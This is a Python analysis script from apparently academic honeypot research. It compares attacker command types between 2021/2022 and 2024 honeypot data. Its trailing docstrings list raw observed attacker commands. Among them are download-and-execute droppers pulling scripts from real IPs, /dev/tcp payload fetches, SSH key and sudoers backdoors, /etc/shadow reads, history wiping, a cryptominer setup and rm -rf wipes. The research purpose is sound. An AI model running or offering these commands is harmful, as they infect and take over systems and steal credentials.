"""
Compare step 03 (2024 vs 2021/2022): Compare attacker behaviour by command.

Loads the command type/count dictionaries for both periods, finds the command
keys present only in 2024 (excluding /tmp/ and ./ paths), and collects their
associated concrete commands into ``unique_t`` for inspection. The trailing
triple-quoted blocks record the observed 2024-only commands from the paper.

Input  : <period>/data/3-大类提取.json , <period>/data/4-复杂指令类型分析-sorted.json
         for both periods.
Output : unique_t dict (computed in memory; no file written)
"""
# --coding:utf-8--
import os
import json

# === Config ===
# Original (hardcoded) 2021 root: "D:/科研/Honey-GPT/Honeypot Data/Data-process-new"
# Original (hardcoded) 2024 root: ".."  (this file lives in period_2024/compare/)
ROOT_2024 = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
ROOT_2021 = os.path.join(os.path.dirname(ROOT_2024), "period_2021_2022")

def get_sorted_comd_type_dict(path):
    with open(path + '/data/3-大类提取.json', 'r') as file:
        sample_dict = json.load(file)
    with open(path + '/data/4-复杂指令类型分析-sorted.json', 'r') as file:
        complex_dict = json.load(file)

    comd_type_dict={}

    for i in sample_dict:
        comd_type_dict[i] = sample_dict[i][-1]

    for i in complex_dict:
        comd_type_dict[i] = len(complex_dict[i])

    sorted_comd_type_dict = dict(sorted(comd_type_dict.items(), key=lambda item: item[1]))
    return sorted_comd_type_dict, {**sample_dict, **complex_dict}

dict_2024,t_2024 = get_sorted_comd_type_dict(ROOT_2024)
dict_2021,t = get_sorted_comd_type_dict(ROOT_2021)

# Use set operations to find the keys that belong only to dict_2024
unique_keys = set(dict_2024.keys()) - set(dict_2021.keys())

# Output the result
unique_t= {}
for i in unique_keys:
    if i[:5]=="/tmp/":
        continue
    if i[:2]=="./":
        continue
    unique_t[i] = t_2024[i]
1

"""
/tmp/LdIZfonKCM
cp
..
/bin/bash
EHLO
touch
HELP
exit
history
curl
pkill
screen
grep
install
o
whoami
hostname
syatem
openssl
?
apt
nan
free
"""

"""
wget  https://ipinfo.io/org > 1
cat /proc/cpuinfo | grep name | cut -f2 -d: | uniq -c ; uname -a
cd /tmp; echo ''>DIRTEST || cd /var; echo ''>DIRTEST; wget http://91.92.244.6/8UsA.sh; curl -O http://91.92.244.6/8UsA.sh; chmod 777 8UsA.sh; sh 8UsA.sh; tftp 91.92.244.6 -c get t8UsA.sh; chmod 777 t8UsA.sh; sh t8UsA.sh; tftp -r t8UsA2.sh -g 91.92.244.6; chmod 777 t8UsA2.sh; sh t8UsA2.sh; rm -rf 8UsA.sh t8UsA.sh t8UsA2.sh
cat /proc/1/mounts && ls /proc/1/
/bin/busybox cat /bin/busybox || while read i; do /bin/busybox echo ; done < /bin/busybox || /bin/busybox dd if=/bin/busybox bs=22 count=1
echo -e '\x54C_CONTINUE' > /uwu
cat /bin/ls|more
uname -a ; nproc
echo 1 && cat /bin/echo
nvidia-smi --list-gpus | grep 0 | cut -f2 -d:
sudo hive-passwd set ifjeeisurofmioufiose; sudo hive-passwd ifjeeisurofmioufiose; pkill Xorg; pkill x11vnc; pkill Hello; systemctl stop shellinabox; history -c; cat /hive-config/rig.conf; uname -a
/bin/bash -c "uname -a ; nvidia-smi --list-gpus | grep 0 | cut -f2 -d: | uniq -c"
/bin/busybox cat /proc/self/exe || cat /proc/self/exe
cd /tmp; wget http://5.10.249.153:9999/exec.sh; curl -O http://5.10.249.153:9999/exec.sh; bash exec.sh
lscpu && echo -e "kqymhM7C\nkqymhM7C" | passwd && curl https://ipinfo.io/org --insecure -s && free -h && apt
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://216.250.247.185/bins.sh; busybox wget http://216.250.247.185/bins.sh; curl -O http://216.250.247.185/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp 216.250.247.185 -c get bins.sh; chmod 777 bins.sh; sh bins.sh; tftp -r bins.sh -g 216.250.247.185; chmod 777 bins.sh; sh bins.sh; ftpget -v -u anonymous -p anonymous -P 21 216.250.247.185 bins.sh bins.sh; sh bins.sh; rm -rf bins.sh; rm -rf *;exit
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
>A@/XBV'8ELFGVR
dd if=/proc/self/exe bs=22 count=2 || while read i; do echo $i; done < /proc/self/exe || cat /proc/self/exe;
./oinasf; dd if=/proc/self/exe bs=22 count=1 || while read i; do echo $i; done < /proc/self/exe || cat /proc/self/exe;
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; busybox wget http://141.98.10.76/booters.sh; wget http://141.98.10.76/booters.sh; curl -O http://141.98.10.76/booters.sh; chmod 777 booters.sh; sh booters.sh
chmod +x setup.sh; sh setup.sh; rm -rf setup.sh; mkdir -p ~/.ssh; chattr -ia ~/.ssh/authorized_keys; echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCqHrvnL6l7rT/mt1AdgdY9tC1GPK216q0q/7neNVqm7AgvfJIM3ZKniGC3S5x6KOEApk+83GM4IKjCPfq007SvT07qh9AscVxegv66I5yuZTEaDAG6cPXxg3/0oXHTOTvxelgbRrMzfU5SEDAEi8+ByKMefE+pDVALgSTBYhol96hu1GthAMtPAFahqxrvaRR4nL4ijxOsmSLREoAb1lxiX7yvoYLT45/1c5dJdrJrQ60uKyieQ6FieWpO2xF6tzfdmHbiVdSmdw0BiCRwe+fuknZYQxIC1owAj2p5bc+nzVTi3mtBEk9rGpgBnJ1hcEUslEf/zevIcX8+6H7kUMRr rsa-key-20230629" > ~/.ssh/authorized_keys; chattr +ai ~/.ssh/authorized_keys; uname -a; echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A";
rm -rf mips; wget http://38.45.200.163/mips || curl -O http://38.45.200.163/mips || tftp 38.45.200.163 -c get mips || tftp -g -r mips 38.45.200.163; chmod 777 mips;./mips ssh; rm -rf mips
wget http://91.92.244.6/bins/hacker.x86; curl -O http://91.92.244.6/bins/hacker.x86;cat hacker.x86 >Clown;chmod +x *;./Clown Joker.wget.x86
/bin/busybox mkdir /tmp/; >/tmp/.file && cd /tmp/
df -h | head -n 2 | awk 'FNR == 2 {print $2;}'
/bin/busybox echo -en '\x00\x7f\x45\x4c\x46\x00\x6d\x69\x70\x73\x00\x6d\x69\x70\x73\x65\x6c\x00\x70\x6f\x77\x65\x72\x70\x63\x00\x73\x68\x34\x00\x6d\x36\x38' > .x && /bin/busybox echo -en '\x45\x43\x48\x4f\x44\x4f\x4e\x45'
unset HISTORY HISTFILE HISTSAVE HISTZONE HISTORY HISTLOG WATCH ; history -n ; export HISTFILE=/dev/null ; export HISTSIZE=0; export HISTFILESIZE=0;
uname -a ;wget -qO - http://80.68.196.6/wei|perl ; cd /tmp ; curl -O http://80.68.196.6/wei ; fetch http://80.68.196.6/wei ; perl wei ;rm -rf wei*
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36
cd /tmp; curl http://23.95.132.42/bins/bins.sh -O; busybox curl http://23.95.132.42/bins/bins.sh -O; wget http://23.95.132.42/bins/bins.sh -O bins.sh; busybox wget http://23.95.132.42/bins/bins.sh -O bins.sh; chmod 777 bins.sh; busybox chmod 777 bins.sh; sh bins.sh; rm -rf bins.sh
nvidia-smi --list-gpus | grep 0 | cut -f2 -d: | uniq -c
/bin/busybox cp /bin/busybox .x; /bin/busybox cp /bin/busybox .z; >.x; >.z; /bin/busybox chmod 777 .x .z
#!/bin/sh; PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin; wget http://43.249.172.195:888/112; curl -O http://43.249.172.195:888/112; chmod +x 112; ./112; wget http://43.249.172.195:888/112s; curl -O http://43.249.172.195:888/112s; chmod +x 112s; ./112s; rm -rf 112.sh; rm -rf 112; rm -rf 112s; history -c;
cd ~; chattr -ia .ssh; lockr -ia .ssh
/bin/busybox wget; /bin/busybox tftp; /bin/busybox HGYQA
wget  https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/setup_moneroocean_miner.sh | bash -s 46BuxHk6RE4WnrAD1PeGkTJwYLc1VtEUb5rnmRGe2vweSeFUpCn9Q4UYewGtJwycXWE2Uc2WgCJsZCNTVGMf97tj5q5McVo
/bin/busybox wget http://37.49.224.231:80/batkek/arm -O -> .z; /bin/busybox chmod 777 .z; ./.z telnet.arm.wget; >.z
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://139.59.88.74/update.sh -O update.sh; busybox wget http://139.59.88.74/update.sh -O update.sh; curl http://139.59.88.74/update.sh -O update.sh; busybox curl http://139.59.88.74/update.sh -O update.sh; ftpget -v -u anonymous -p anonymous -P 21 139.59.88.74 update.sh update.sh; busybox ftpget -v -u anonymous -p anonymous -P 21 139.59.88.74 update.sh update.sh; chmod 777 update.sh; ./update.sh; rm -rf update.sh
sh -c 'for proc_dir in /proc/[0-9]*; do pid=${proc_dir##*/}; buffer=$(cat "/proc/$pid/maps"); if [ "${#buffer}" -gt 1 ]; then if [ "${buffer#*"/lib/"}" = "$buffer" ] && [ "${buffer#*"/lib64/"}" = "$buffer" ] && [ "${buffer#*"dvrLocker"}" = "$buffer" ]; then kill -9 "$pid"; fi; fi; done'
echo "cat /proc/1/mounts && ls /proc/1/" | sh
nohup bash -c "exec 6<>/dev/tcp/139.59.32.59/60146 && echo -n 'GET /linux' >&6 && cat 0<&6 > /tmp/w7JH7CEVd3 && chmod +x /tmp/w7JH7CEVd3 && /tmp/w7JH7CEVd3 spqwTYPo/4VRp5y6uZ+5UoLn8e1RvZmzuZ+4W4br4IZTs82zuZOxV4Pr44ZTuPS5tZm4V4AAj7a5MRLDh9o/JoMM" &@f@fQtdBUPX!
cat /bin/echo||while read i; do echo $i; done < /proc/self/exe;
chmod +x setup.sh; sh setup.sh; rm -rf setup.sh; mkdir -p ~/.ssh; chattr -ia ~/.ssh/authorized_keys; echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCqHrvnL6l7rT/mt1AdgdY9tC1GPK216q0q/7neNVqm7AgvfJIM3ZKniGC3S5x6KOEApk+83GM4IKjCPfq007SvT07qh9AscVxegv66I5yuZTEaDAG6cPXxg3/0oXHTOTvxelgbRrMzfU5SEDAEi8+ByKMefE+pDVALgSTBYhol96hu1GthAMtPAFahqxrvaRR4nL4ijxOsmSLREoAb1lxiX7yvoYLT45/1c5dJdrJrQ60uKyieQ6FieWpO2xF6tzfdmHbiVdSmdw0BiCRwe+fuknZYQxIC1owAj2p5bc+nzVTi3mtBEk9rGpgBnJ1hcEUslEf/zevIcX8+6H7kUMRr rsa-key-20230629" > ~/.ssh/authorized_keys; chattr +ai ~/.ssh/authorized_keys; uname -a
rm -rf 1.sh; wget http://94.103.188.167/1.sh; chmod +x 1.sh; ./1.sh
nohup bash -c "exec 6<>/dev/tcp/37.27.13.173/60136 && echo -n 'GET /linux' >&6 && cat 0<&6 > /tmp/nY8Q1IRk5m && chmod +x /tmp/nY8Q1IRk5m && /tmp/nY8Q1IRk5m D9GTl5Sed2uXlYqO2Q4E15CIl5NlfYiXiJnPDw3QjoCSnHN1l5GBgNkQDNCZl5eVcmuTk4OW0Q8M1YCNkoh3dpCLiJbYEAzQmIOTlnR0lIWKl88MCc+RiouXcnack4mR0gge2Y6LlJ9rd5aWl5HZBwTXkIiXnmV9iJeImc8MDtCOipecc3WXlIyA2RAM0JmXlJR1a5eQg5bRDwrQgIGLlHd3iJeKkc8KBtuWiZSSdmWSkpeS0ggQ2ZWXlJB/c5aUipfBDw7SjoiVl2t0k5aXktYECNGRiZWGfWuUlICO0w8Gz5SDk5Z0dZXhaynuOvCGw1afV4mK3w4=" &0O0O6(6(Qtd?UPX!
echo "/bin/busybox ERTJJ" | sh
for proc_dir in /proc/[0-9]*; do pid=${proc_dir##*/}; buffer=$(cat "/proc/$pid/maps"); if [ "${#buffer}" -gt 1 ]; then if [ "${buffer#*"/lib/"}" = "$buffer" ] && [ "${buffer#*"/lib64/"}" = "$buffer" ] && [ "${buffer#*"dvrLocker"}" = "$buffer" ]; then kill -9 "$pid"; fi; fi; done
uname -m&&pkill upnpsetup
/bin/busybox echo -en '\x6b\x00\x73\x70\x61\x72\x63\x00\x5c\x78\x25\x78\x00\x3d\x00\x68\x60\x6e\x69\x00\x74\x62\x75\x69\x66\x6a\x62\x00\x71\x75\x63\x71\x74' >> .x && /bin/busybox echo -en '\x45\x43\x48\x4f\x44\x4f\x4e\x45'
dd bs=1 count=1778300 > /tmp/vzfW2wiGNw
/bin/busybox cp /bin/busybox .z; >.z; /bin/busybox chmod 777 .z
nohup bash -c "exec 6<>/dev/tcp/139.59.32.59/60146 && echo -n 'GET /linux' >&6 && cat 0<&6 > /tmp/w7JH7CEVd3 && chmod +x /tmp/w7JH7CEVd3 && /tmp/w7JH7CEVd3 spqwTYPo/4VRp5y6uZ+5UoLn8e1RvZmzuZ+4W4br4IZTs82zuZOxV4Pr44ZTuPS5tZm4V4AAj7a5MRLDh9o/JoMM" &
dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://216.250.247.185/bins.sh; busybox wget http://216.250.247.185/bins.sh; curl -O http://216.250.247.185/bins.sh; chmod +x bins.sh; sh bins.sh; tftp 216.250.247.185 -c get bins.sh; chmod 777 bins.sh; sh bins.sh; tftp -r bins.sh -g 216.250.247.185; chmod 777 bins.sh; sh bins.sh; ftpget -v -u anonymous -p anonymous -P 21 216.250.247.185 bins.sh bins.sh; sh bins.sh; rm -rf bins.sh; rm -rf *.sh
wget  https://ipinfo.io/org |echo
uname -a && nproc
cd /tmp; wget http://91.92.249.158/ohshit.sh; busybox wget http://91.92.249.158/ohshit.sh; chmod 777 ohshit.sh; sh ohshit.sh; rm -f ohshit.sh
rm -rf sh; wget http://185.191.127.212/sh || curl -O http://185.191.127.212/sh || tftp 185.191.127.212 -c get sh || tftp -g -r sh 185.191.127.212; chmod 777 sh;./sh ssh; rm -rf sh
./.x; ./.z telnet.arm.echo; >.x; >.z
nohup $SHELL -c "curl http://43.132.150.184:60134/linux -o /tmp/jW8uGmkJLN; if [ ! -f /tmp/jW8uGmkJLN ]; then wget http://43.132.150.184:60134/linux -O /tmp/jW8uGmkJLN; fi; if [ ! -f /tmp/jW8uGmkJLN ]; then exec 6<>/dev/tcp/43.132.150.184/60134 && echo -n 'GET /linux' >&6 && cat 0<&6 > /tmp/jW8uGmkJLN && chmod +x /tmp/jW8uGmkJLN && /tmp/jW8uGmkJLN 5N33jOv0jPLTm5vI7Y719IX1zZibzeOO8PyR9ciHnMntjff2hfXNmJnJ44v2647wz4eYyPOR9P2L+cuZmM73n/T1jO3PmJDT9Y/r943yx5+ZzPeJ5fSH8NObms3ti/HrhvHHn5nM8Yjl8Iftz5uY0/KH9+uJ8cefmczzj+X0jvLTmJ3T8of164f3x5+ZzPGH5fSN89Obm8ntjvH2kfLOnZPL84718Z/yzJiHy/CR8fGR9c+Tn83yj/PljvLMh5vO85H0/IztzJ6Qx/WP9PeP486Qh8zziuv2h+3LnZPL84709J/yz5iHyfKR9/aR8cyQk8vzjvf0n/LMnofF+5Hx8pH0xJOfzfKP/eWO8ciHnsTtjvXzkfLJk5/N8oz15Yz605ifyO2O/fKR8sWak8vzjvbwn/LNmIfO95H39ontzJybx/WP9PGI486fh8zwi+vxiu3PnJPL84708p/3zoeYyPaR/fCR8smZk8vzjvT3n/LFm4fM9o7r8I/ty5CTy/OO9POf8s2Rh8z7juv0jfHTm5vM+Yn19I/y3ZiZzO2L9uuO+8uHm8z6hfP1jvfIiZ3K7Yby64z605ifzvmJ9fSP8d2dntPyj/zrjfHTmJnF+Yn19Iz13ZiYxO2G9OuG+tOYnMj5ifX0jfHdmIfM8ZHz9pHyypyTy/OO9/af8syYh8z3kfT9j+3FnZPL8473/Z/yy52HyPGR9/WP7c+akcf1j/T3jePOkIfM84rr9ofty52Ty/OO9PSf8s+Yh8nwkfT3jO3OnpPL847185/yz5mHz/GL6/SL8NOYmsn5ifX0j/cyD51uwAXRXvKbdX8=; fi; echo 123456 > /tmp/.opass; chmod +x /tmp/jW8uGmkJLN && /tmp/jW8uGmkJLN 5N33jOv0jPLTm5vI7Y719IX1zZibzeOO8PyR9ciHnMntjff2hfXNmJnJ44v2647wz4eYyPOR9P2L+cuZmM73n/T1jO3PmJDT9Y/r943yx5+ZzPeJ5fSH8NObms3ti/HrhvHHn5nM8Yjl8Iftz5uY0/KH9+uJ8cefmczzj+X0jvLTmJ3T8of164f3x5+ZzPGH5fSN89Obm8ntjvH2kfLOnZPL84718Z/yzJiHy/CR8fGR9c+Tn83yj/PljvLMh5vO85H0/IztzJ6Qx/WP9PeP486Qh8zziuv2h+3LnZPL84709J/yz5iHyfKR9/aR8cyQk8vzjvf0n/LMnofF+5Hx8pH0xJOfzfKP/eWO8ciHnsTtjvXzkfLJk5/N8oz15Yz605ifyO2O/fKR8sWak8vzjvbwn/LNmIfO95H39ontzJybx/WP9PGI486fh8zwi+vxiu3PnJPL84708p/3zoeYyPaR/fCR8smZk8vzjvT3n/LFm4fM9o7r8I/ty5CTy/OO9POf8s2Rh8z7juv0jfHTm5vM+Yn19I/y3ZiZzO2L9uuO+8uHm8z6hfP1jvfIiZ3K7Yby64z605ifzvmJ9fSP8d2dntPyj/zrjfHTmJnF+Yn19Iz13ZiYxO2G9OuG+tOYnMj5ifX0jfHdmIfM8ZHz9pHyypyTy/OO9/af8syYh8z3kfT9j+3FnZPL8473/Z/yy52HyPGR9/WP7c+akcf1j/T3jePOkIfM84rr9ofty52Ty/OO9PSf8s+Yh8nwkfT3jO3OnpPL847185/yz5mHz/GL6/SL8NOYmsn5ifX0j/cyD51uwAXRXvKbdX8=" &
whoami > 1;la
head -c 0 > /tmp/windows_sign
uname -a & lscpu
nohup $SHELL -c "curl http://8.218.230.152:60116/linux -o /tmp/mkK47vJW2R; if [ ! -f /tmp/mkK47vJW2R ]; then wget http://8.218.230.152:60116/linux -O /tmp/mkK47vJW2R; fi; if [ ! -f /tmp/mkK47vJW2R ]; then exec 6<>/dev/tcp/8.218.230.152/60116 && echo -n 'GET /linux' >&6 && cat 0<&6 > /tmp/mkK47vJW2R && chmod +x /tmp/mkK47vJW2R && /tmp/mkK47vJW2R w0LZkBHRVdynAByECXBsD4YbHqLYU98Zl9FMuLtM2ZQGyVLSpR4cjwF+bwuFAx+n3ErOEJLGULi0VNiTGMhE0L0cHIwXamsXixQUpdhVyxCC2lK3oFvZjBrNV8akFheKCW9uCZwVAKHZU9Eal9hMtrxY3pIZy1zIqwAfjQFwZguSGxmp3lTOGJHIVrmgUNyRBs1X3b0cHIYPbm8NhQ0WvdpVyAaU30y3uFjekhnPXMirAB+NCXBsC4kDH6LcXskYk9lRrrpVxpAczErZox4DiAtkaAmNHByz3FPRGpbaTLq4TN2XEslU2aAaDY0IbHAPkhkfvdlVzxKU2FO+t0LZlxHRUt29HxuSD2hkD4wcHavIXNEak9BMvL1SxpMdzV7eox8cihlmcAuNFACm2UrNHZfSVL6/UdGCGc1WxqEcG5INZ3ALjB8UpdhVzxuC3FWguVTGlR/RVdCkFBuMCG1pGYQZAKHcU9EZlttMvLtY3pIZz1HIoh8akgttcAyLAx2h0lLPGZHZQr+6UsaQHMZK2qEfA4sBZGgJjRkbs9lcygaT0Vugu1DGlBLJVNmnGg2EF2xvCZIfHr3ZXMoSlNhTv7dC3JUGzVDbvR8VkgBqZA+MHB+gyFbPEYzRU6C8UNuMH8de3qMfHYwZaG4XjR8Apt1KzhmY3lK/vVfIkBjNStmkFwOLCXBsCYYbHqLbUN8QjNlRtqBa0IwZz1XSpR4cjQl+bAiFAx+m2krOEJvGU7q6WN6SGc5TyKsAH40BcG8OiAMfpNFeyRiT21uVeAKTRM1x/M4zu8dYOmRhe5YdXRQVMmwx6hobZ3s=; fi; echo 123456 > /tmp/.opass; chmod +x /tmp/mkK47vJW2R && /tmp/mkK47vJW2R w0LZkBHRVdynAByECXBsD4YbHqLYU98Zl9FMuLtM2ZQGyVLSpR4cjwF+bwuFAx+n3ErOEJLGULi0VNiTGMhE0L0cHIwXamsXixQUpdhVyxCC2lK3oFvZjBrNV8akFheKCW9uCZwVAKHZU9Eal9hMtrxY3pIZy1zIqwAfjQFwZguSGxmp3lTOGJHIVrmgUNyRBs1X3b0cHIYPbm8NhQ0WvdpVyAaU30y3uFjekhnPXMirAB+NCXBsC4kDH6LcXskYk9lRrrpVxpAczErZox4DiAtkaAmNHByz3FPRGpbaTLq4TN2XEslU2aAaDY0IbHAPkhkfvdlVzxKU2FO+t0LZlxHRUt29HxuSD2hkD4wcHavIXNEak9BMvL1SxpMdzV7eox8cihlmcAuNFACm2UrNHZfSVL6/UdGCGc1WxqEcG5INZ3ALjB8UpdhVzxuC3FWguVTGlR/RVdCkFBuMCG1pGYQZAKHcU9EZlttMvLtY3pIZz1HIoh8akgttcAyLAx2h0lLPGZHZQr+6UsaQHMZK2qEfA4sBZGgJjRkbs9lcygaT0Vugu1DGlBLJVNmnGg2EF2xvCZIfHr3ZXMoSlNhTv7dC3JUGzVDbvR8VkgBqZA+MHB+gyFbPEYzRU6C8UNuMH8de3qMfHYwZaG4XjR8Apt1KzhmY3lK/vVfIkBjNStmkFwOLCXBsCYYbHqLbUN8QjNlRtqBa0IwZz1XSpR4cjQl+bAiFAx+m2krOEJvGU7q6WN6SGc5TyKsAH40BcG8OiAMfpNFeyRiT21uVeAKTRM1x/M4zu8dYOmRhe5YdXRQVMmwx6hobZ3s=" &#UPX!
uname -a ; nvidia-smi --list-gpus | grep 0 | cut -f2 -d: | uniq -c
cat /proc/mounts || busybox cat /proc/mounts
uname -a;id;cat /etc/shadow /etc/passwd;lscpu;echo 'daemon ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers;chsh -s /bin/sh daemon;echo Password123 |passwd daemon --stdin;mkdir ~/.ssh;chattr -ia ~/.ssh/* ~/.ssh;wget http://sos.vivi.sg/ns1.jpg -O ~/.ssh/authorized_keys;chmod 600 ~/.ssh/authorized_keys;wget http://sos.vivi.sg/ns3.jpg -O /tmp/x;chmod +x /tmp/x;/tmp/x;mv /tmp/x /tmp/o;/tmp/o;rm -f /tmp/o;mkdir /sbin/.ssh;cp ~/.ssh/authorized_keys /sbin/.ssh;chown daemon.daemon /sbin/.ssh /sbin/.ssh/*;chmod 700 /sbin/.ssh;chmod 600 /sbin/.ssh/authorized_keys;wget http://sos.vivi.sg/oto -O /etc/oto;chmod 755 /tmp/oto;/tmp/oto;curl http://sos.vivi.sg/oto -o /tmp/oto;chmod 755 /tmp/oto;/tmp/oto;rm -f /tmp/oto
apt update && apt install sudo curl -y && sudo useradd -m -p $(openssl passwd -1 kqymhM7C) system && sudo usermod -aG sudo system
wget http://93.123.85.139/cayosinbins.sh; chmod 777 cayosinbins.sh; sh cayosinbins.sh; tftp 93.123.85.139 -c get cayosintftp1.sh; chmod 777 cayosintftp1.sh; sh cayosintftp1.sh; tftp -r cayosintftp2.sh -g 93.123.85.139; chmod 777 cayosintftp2.sh; sh cayosintftp2.sh; rm -rf cayosinbins.sh cayosintftp1.sh cayosintftp2.sh; rm -rf *

"""
